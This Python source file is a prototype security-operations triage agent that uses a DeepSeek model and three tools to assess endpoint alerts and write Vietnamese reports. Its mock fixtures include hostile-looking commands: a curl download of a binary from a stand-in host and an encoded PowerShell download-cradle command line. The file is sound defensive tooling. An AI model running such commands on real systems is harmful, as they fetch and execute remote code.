#!/usr/bin/env python3
"""SOC Triage Agent prototype — DeepSeek + 3 tools.

Mục đích: chứng minh agent loop hoạt động trước khi build multi-agent.
- Nhận 1 alert mock (giả lập từ RED detect_live.py)
- Agent dùng tools để gather context
- Output: report tiếng Việt + severity

Cài đặt:
  pip install openai requests

Chạy:
  export DEEPSEEK_API_KEY="sk-..."
  python3 agent/prototype.py                  # dùng mock alert
  python3 agent/prototype.py --es-real        # query Elasticsearch thật
"""

import os
import sys
import json
import argparse
import logging
from typing import Any

try:
    from openai import OpenAI
except ImportError:
    sys.exit("pip install openai")

try:
    import requests
except ImportError:
    sys.exit("pip install requests")

# Load .env file (project root) — bỏ qua nếu không có dotenv
try:
    from dotenv import load_dotenv
    _env_path = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), ".env")
    load_dotenv(_env_path)
except ImportError:
    pass  # không bắt buộc, env vars vẫn có thể được set thủ công


# ── Config (từ .env hoặc env vars) ────────────────────────────────
DEEPSEEK_API_KEY = os.environ.get("DEEPSEEK_API_KEY")
DEEPSEEK_BASE_URL = os.environ.get("DEEPSEEK_BASE_URL", "https://api.deepseek.com")
DEEPSEEK_MODEL = os.environ.get("DEEPSEEK_MODEL", "deepseek-chat")

ES_HOST = os.environ.get("ES_HOST", "http://10.10.20.100:9200")
ES_USER = os.environ.get("ES_USER", "elastic")
ES_PASSWORD = os.environ.get("ES_PASSWORD", "")
ES_AUTH = (ES_USER, ES_PASSWORD) if ES_PASSWORD else None
ES_RED_INDEX = os.environ.get("ES_RED_INDEX", "red-alerts")

MAX_ITER = int(os.environ.get("AGENT_MAX_ITERATIONS", "8"))
TEMPERATURE = float(os.environ.get("AGENT_TEMPERATURE", "0.2"))
LOG_LEVEL = os.environ.get("AGENT_LOG_LEVEL", "INFO")

logging.basicConfig(level=LOG_LEVEL, format="%(asctime)s [%(name)s] %(levelname)s: %(message)s")
logger = logging.getLogger("prototype")

USE_REAL_ES = False  # set True qua --es-real để query ES thật


# ── Tools ───────────────────────────────────────────────────────────
def query_es_history(host: str, hours: int = 24) -> dict:
    """Lấy alerts gần đây của host trong N giờ qua từ red-alerts."""
    if not USE_REAL_ES:
        return {
            "count": 2,
            "alerts": [
                {"timestamp": "2026-05-14T08:15:00Z", "rule": "powershell_suspicious", "score": 0.72},
                {"timestamp": "2026-05-14T09:42:00Z", "rule": "lsass_access", "score": 0.81},
            ],
            "_mock": True,
        }

    query = {
        "query": {
            "bool": {
                "must": [
                    {"term": {"host.name.keyword": host}},
                    {"range": {"@timestamp": {"gte": f"now-{hours}h"}}},
                ]
            }
        },
        "size": 10,
        "sort": [{"@timestamp": "desc"}],
    }
    try:
        r = requests.get(
            f"{ES_HOST}/{ES_RED_INDEX}/_search",
            json=query,
            auth=ES_AUTH,
            timeout=10,
        )
        hits = r.json().get("hits", {}).get("hits", [])
        return {
            "count": len(hits),
            "alerts": [h["_source"] for h in hits],
        }
    except Exception as e:
        return {"error": str(e), "count": 0, "alerts": []}


def get_process_tree(host: str, command_line: str) -> dict:
    """Lấy cây process (parent → child) quanh event.

    Simplified — production dùng winlog.event_data.ParentImage + process.entity_id.
    """
    if not USE_REAL_ES:
        return {
            "tree": [
                {"level": 0, "name": "explorer.exe", "user": "alice"},
                {"level": 1, "name": "outlook.exe", "user": "alice"},
                {"level": 2, "name": "powershell.exe", "user": "alice", "command": command_line[:80]},
                {"level": 3, "name": "curl.exe", "user": "alice", "command": "curl http://1.2.3.4/x.bin"},
            ],
            "_mock": True,
            "interpretation": "outlook.exe spawn powershell → curl: nghi vấn email phishing → execution → C2",
        }

    return {"tree": "not implemented for real ES yet", "_todo": True}


def lookup_mitre(rule_name: str) -> dict:
    """Map Sigma rule name → MITRE ATT&CK tactic/technique. Local lookup table."""
    table = {
        "powershell_encoded_command": {
            "tactic": "TA0002 Execution",
            "technique": "T1059.001 PowerShell",
            "sub_techniques": ["T1027 Obfuscated Files or Information"],
            "severity_baseline": "high",
        },
        "powershell_amsi_bypass": {
            "tactic": "TA0005 Defense Evasion",
            "technique": "T1562.001 Disable or Modify Tools",
            "severity_baseline": "critical",
        },
        "lsass_access": {
            "tactic": "TA0006 Credential Access",
            "technique": "T1003.001 LSASS Memory",
            "severity_baseline": "critical",
        },
        "powershell_suspicious": {
            "tactic": "TA0002 Execution",
            "technique": "T1059.001 PowerShell",
            "severity_baseline": "medium",
        },
    }
    info = table.get(rule_name)
    if info:
        return info
    return {
        "tactic": "Unknown",
        "technique": "Unknown",
        "note": f"Rule '{rule_name}' chưa có trong MITRE lookup. Cần bổ sung vào table.",
    }


# ── Tool schema (OpenAI/DeepSeek format) ────────────────────────────
TOOLS_SCHEMA = [
    {
        "type": "function",
        "function": {
            "name": "query_es_history",
            "description": "Lấy danh sách alerts gần đây của một host từ index red-alerts trong N giờ qua. Dùng để xem host này có pattern attack lặp lại không.",
            "parameters": {
                "type": "object",
                "properties": {
                    "host": {"type": "string", "description": "Tên host (e.g. WIN-01)"},
                    "hours": {"type": "integer", "description": "Số giờ tra cứu", "default": 24},
                },
                "required": ["host"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "get_process_tree",
            "description": "Lấy cây process parent → child quanh event. Giúp hiểu context: process này được khởi từ đâu, spawn ra cái gì.",
            "parameters": {
                "type": "object",
                "properties": {
                    "host": {"type": "string"},
                    "command_line": {"type": "string", "description": "Command line của process suspicious"},
                },
                "required": ["host", "command_line"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "lookup_mitre",
            "description": "Map Sigma rule name sang MITRE ATT&CK tactic/technique. Dùng để xác định severity baseline và technique attacker đang dùng.",
            "parameters": {
                "type": "object",
                "properties": {
                    "rule_name": {
                        "type": "string",
                        "description": "Tên Sigma rule (e.g. powershell_encoded_command)",
                    },
                },
                "required": ["rule_name"],
            },
        },
    },
]

TOOL_FNS = {
    "query_es_history": query_es_history,
    "get_process_tree": get_process_tree,
    "lookup_mitre": lookup_mitre,
}


# ── Agent loop ──────────────────────────────────────────────────────
SYSTEM_PROMPT = """You are a SOC Triage Agent for a Vietnamese SOC team.

You receive alerts from RED (Rule Evasion Detection) — a system that detects
Sigma rule evasions on Windows endpoints. Your job:

1. Use the available tools to gather context (host history, process tree, MITRE info)
2. Reason about whether this is a true positive or false positive
3. Assess severity: CRITICAL | HIGH | MEDIUM | LOW | FALSE_POSITIVE
4. Write a concise Vietnamese report for the SOC analyst

Guidelines:
- Call tools BEFORE making conclusions — never guess context
- Cite tool results when explaining your reasoning
- Be skeptical: a high RED score alone is not enough; look at process tree, history
- Report MUST be in Vietnamese (the SOC team is Vietnamese)
- When you have enough context, output the FINAL ANSWER as JSON wrapped in <final> tags:

<final>
{
  "severity": "HIGH",
  "is_false_positive": false,
  "confidence": 0.85,
  "mitre_technique": "T1059.001",
  "report_vi": "## Phát hiện ...\\n\\n**Host**: ...\\n\\n..."
}
</final>
"""


def run_agent(alert: dict, max_iter: int = MAX_ITER, verbose: bool = True) -> dict:
    """Run a ReAct loop until the agent returns a final answer."""
    client = OpenAI(api_key=DEEPSEEK_API_KEY, base_url=DEEPSEEK_BASE_URL)

    messages: list[dict[str, Any]] = [
        {"role": "system", "content": SYSTEM_PROMPT},
        {
            "role": "user",
            "content": (
                "Triage the following RED alert. Use tools to gather context "
                "before giving a final answer.\n\n"
                f"```json\n{json.dumps(alert, ensure_ascii=False, indent=2)}\n```"
            ),
        },
    ]

    for step in range(max_iter):
        if verbose:
            logger.info("─── Step %d ───", step + 1)

        resp = client.chat.completions.create(
            model=DEEPSEEK_MODEL,
            messages=messages,
            tools=TOOLS_SCHEMA,
            tool_choice="auto",
            temperature=TEMPERATURE,
        )
        msg = resp.choices[0].message
        messages.append(msg.model_dump(exclude_none=True))

        # Tool calls?
        if msg.tool_calls:
            for tc in msg.tool_calls:
                fn_name = tc.function.name
                fn_args = json.loads(tc.function.arguments)
                if verbose:
                    logger.info("  → call %s(%s)", fn_name, fn_args)
                try:
                    result = TOOL_FNS[fn_name](**fn_args)
                except Exception as e:
                    result = {"error": str(e)}
                if verbose:
                    logger.info("    result: %s", json.dumps(result, ensure_ascii=False)[:200])
                messages.append({
                    "role": "tool",
                    "tool_call_id": tc.id,
                    "content": json.dumps(result, ensure_ascii=False),
                })
            continue

        # No tool call → check for <final> tag
        content = msg.content or ""
        if "<final>" in content and "</final>" in content:
            start = content.index("<final>") + len("<final>")
            end = content.index("</final>")
            payload = content[start:end].strip()
            try:
                final = json.loads(payload)
                final["_raw"] = content
                final["_steps"] = step + 1
                final["_token_usage"] = resp.usage.model_dump() if resp.usage else None
                return final
            except json.JSONDecodeError as e:
                logger.warning("Cannot parse <final> JSON: %s", e)
                return {"error": "invalid final JSON", "raw": content}

        # No tool call AND no final tag → ask for final
        messages.append({
            "role": "user",
            "content": "Bạn đã đủ thông tin chưa? Nếu rồi, hãy đưa <final>{...}</final>.",
        })

    return {"error": "max iterations reached", "_steps": max_iter}


# ── Main ────────────────────────────────────────────────────────────
MOCK_ALERT = {
    "@timestamp": "2026-05-14T10:23:45Z",
    "host": {"name": "WIN-01"},
    "user": {"name": "alice"},
    "process": {
        "name": "powershell.exe",
        "command_line": "powershell -e SQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAA==",
        "parent": {"name": "outlook.exe"},
    },
    "red": {
        "stage1_score": 0.87,
        "stage1_model": "ensemble_f1",
        "top_rules": [
            {"rule_id": "powershell_encoded_command", "cosine_score": 0.91},
            {"rule_id": "powershell_suspicious", "cosine_score": 0.78},
        ],
        "evasion_type": "near_miss",
    },
    "source_event_id": "abc123",
}


def main():
    global USE_REAL_ES
    parser = argparse.ArgumentParser(description="SOC Triage Agent prototype")
    parser.add_argument("--es-real", action="store_true", help="Query Elasticsearch thật thay vì mock")
    parser.add_argument("--alert-file", type=str, help="Path tới alert JSON (mặc định: mock)")
    parser.add_argument("--quiet", action="store_true")
    args = parser.parse_args()

    if not DEEPSEEK_API_KEY:
        sys.exit("ERROR: set DEEPSEEK_API_KEY env var first")

    USE_REAL_ES = args.es_real
    if USE_REAL_ES and not ES_PASSWORD:
        logger.warning("ES_PASSWORD not set — ES queries có thể fail")

    if args.alert_file:
        with open(args.alert_file) as f:
            alert = json.load(f)
    else:
        alert = MOCK_ALERT

    logger.info("Starting triage for host=%s, score=%s",
                alert.get("host", {}).get("name"),
                alert.get("red", {}).get("stage1_score"))

    result = run_agent(alert, verbose=not args.quiet)

    print("\n" + "=" * 70)
    print("FINAL RESULT")
    print("=" * 70)
    print(json.dumps(
        {k: v for k, v in result.items() if not k.startswith("_")},
        ensure_ascii=False,
        indent=2,
    ))
    print(f"\nSteps: {result.get('_steps')}")
    print(f"Token usage: {result.get('_token_usage')}")


if __name__ == "__main__":
    main()
